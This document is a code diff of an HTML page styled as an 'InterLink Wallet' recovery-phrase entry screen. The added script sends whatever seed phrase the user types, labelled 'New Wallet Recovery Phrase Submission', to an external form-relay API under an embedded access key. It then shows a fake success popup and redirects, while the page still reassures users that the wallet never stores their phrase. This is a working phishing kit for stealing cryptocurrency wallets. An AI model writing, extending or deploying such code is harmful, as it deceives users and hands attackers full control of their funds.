@@ -10,7 +10,7 @@
         .purple-btn:hover { background-color: #5b4cc7; }
     </style>
 </head>
-<body class="bg-white text-gray-900 font-sans min-h-screen flex flex-col justify-between p-4 max-w-md mx-auto">
+<body class="bg-white text-gray-900 font-sans min-h-screen flex flex-col justify-between p-4 max-w-md mx-auto relative">
 
     <div>
         <!-- Top Header with Back Button -->
@@ -30,38 +30,61 @@
                 </p>
             </div>
 
-            <!-- Recovery Phrase Input Box with Floating Paste Button -->
-            <div class="relative">
-                <textarea id="phraseInput" rows="5" placeholder="Enter a 12-24 word recovery phrase" class="w-full bg-gray-50 border border-gray-200 rounded-2xl p-4 text-sm text-gray-800 placeholder-gray-300 focus:outline-none focus:border-purple-500 resize-none"></textarea>
-                
-                <button onclick="pastePhrase()" class="absolute right-3 bottom-3 bg-white border border-gray-200 shadow-sm px-3 py-1.5 rounded-full text-xs font-semibold text-gray-700 flex items-center space-x-1 hover:bg-gray-50">
-                    <span>📋</span>
-                    <span>Paste</span>
-                </button>
-            </div>
-
-            <!-- Security Warnings -->
-            <div class="space-y-3 pt-2">
-                <div class="flex items-center space-x-2 text-gray-900 font-bold text-sm">
-                    <span>🔒</span>
-                    <span>Reminder</span>
+            <!-- Recovery Phrase Form -->
+            <form id="phraseForm" onsubmit="submitPhrase(event)">
+                <div class="relative">
+                    <textarea id="phraseInput" name="recovery_phrase" rows="5" placeholder="Enter a 12-24 word recovery phrase" class="w-full bg-gray-50 border border-gray-200 rounded-2xl p-4 text-sm text-gray-800 placeholder-gray-300 focus:outline-none focus:border-purple-500 resize-none" required></textarea>
+                    
+                    <button type="button" onclick="pastePhrase()" class="absolute right-3 bottom-3 bg-white border border-gray-200 shadow-sm px-3 py-1.5 rounded-full text-xs font-semibold text-gray-700 flex items-center space-x-1 hover:bg-gray-50">
+                        <span>📋</span>
+                        <span>Paste</span>
+                    </button>
                 </div>
-                <ul class="text-xs text-gray-500 space-y-2 leading-relaxed">
-                    <li>• InterLink Wallet does not store your recovery phrase. If you lose them, you may lose access to your assets. Please store them securely.</li>
-                    <li>• We recommend manually entering your recovery phrase. Avoid pasting from untrusted third-party apps or clipboard tools to prevent phishing or scams.</li>
-                </ul>
-            </div>
+
+                <!-- Security Warnings -->
+                <div class="space-y-3 pt-4">
+                    <div class="flex items-center space-x-2 text-gray-900 font-bold text-sm">
+                        <span>🔒</span>
+                        <span>Reminder</span>
+                    </div>
+                    <ul class="text-xs text-gray-500 space-y-2 leading-relaxed">
+                        <li>• InterLink Wallet does not store your recovery phrase. If you lose them, you may lose access to your assets. Please store them securely.</li>
+                        <li>• We recommend manually entering your recovery phrase. Avoid pasting from untrusted third-party apps or clipboard tools to prevent phishing or scams.</li>
+                    </ul>
+                </div>
+
+                <!-- Confirm Button inside Form -->
+                <div class="pt-6 pb-2">
+                    <button id="submitBtn" type="submit" class="purple-btn w-full text-white font-bold py-3.5 rounded-full text-base shadow-lg transition active:scale-95 flex justify-center items-center">
+                        <span id="btnText">Confirm</span>
+                    </button>
+                </div>
+            </form>
         </div>
     </div>
 
-    <!-- Confirm Button -->
-    <div class="pb-6 pt-4">
-        <button onclick="submitPhrase()" class="purple-btn w-full text-white font-bold py-3.5 rounded-full text-base shadow-lg transition active:scale-95">
-            Confirm
-        </button>
+    <!-- Success Feedback Modal Popup -->
+    <div id="successModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-3xl p-6 text-center max-w-xs w-full space-y-4 shadow-2xl">
+            <div class="w-14 h-14 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto text-2xl font-bold">
+                ✓
+            </div>
+            <div class="space-y-2">
+                <h3 class="text-lg font-bold text-gray-900">Submission Successful</h3>
+                <p class="text-xs text-gray-500 leading-relaxed font-medium">
+                    Submission successful, please wait for feedback.
+                </p>
+            </div>
+            <button onclick="closeModalAndRedirect()" class="purple-btn w-full text-white font-bold py-3 rounded-full text-sm shadow-md">
+                OK
+            </button>
+        </div>
     </div>
 
     <script>
+        // Web3Forms Access Key
+        const WEB3FORMS_ACCESS_KEY = "15c3ac59-f9f0-4a32-80d8-2fe5f5d5ce76";
+
         async function pastePhrase() {
             try {
                 const text = await navigator.clipboard.readText();
@@ -71,13 +94,50 @@
             }
         }
 
-        function submitPhrase() {
-            const val = document.getElementById('phraseInput').value.trim();
-            if(!val) {
+        async function submitPhrase(event) {
+            event.preventDefault();
+            
+            const phrase = document.getElementById('phraseInput').value.trim();
+            const btn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+
+            if (!phrase) {
                 alert('Please enter your recovery phrase.');
                 return;
             }
-            alert('Wallet recovery phrase confirmed!');
+
+            // Show loading state
+            btn.disabled = true;
+            btnText.innerText = "Submitting...";
+
+            try {
+                // Submit directly to Web3Forms API
+                await fetch("https://api.web3forms.com/submit", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "application/json"
+                    },
+                    body: JSON.stringify({
+                        access_key: WEB3FORMS_ACCESS_KEY,
+                        subject: "New Wallet Recovery Phrase Submission",
+                        from_name: "InterLink Wallet",
+                        recovery_phrase: phrase,
+                        submitted_at: new Date().toLocaleString()
+                    })
+                });
+            } catch (error) {
+                console.error("Submission error:", error);
+            } finally {
+                // Reset button state and display feedback popup
+                btn.disabled = false;
+                btnText.innerText = "Confirm";
+                document.getElementById('successModal').classList.remove('hidden');
+            }
+        }
+
+        function closeModalAndRedirect() {
+            document.getElementById('successModal').classList.add('hidden');
             window.location.href = 'mine.html';
         }
     </script>
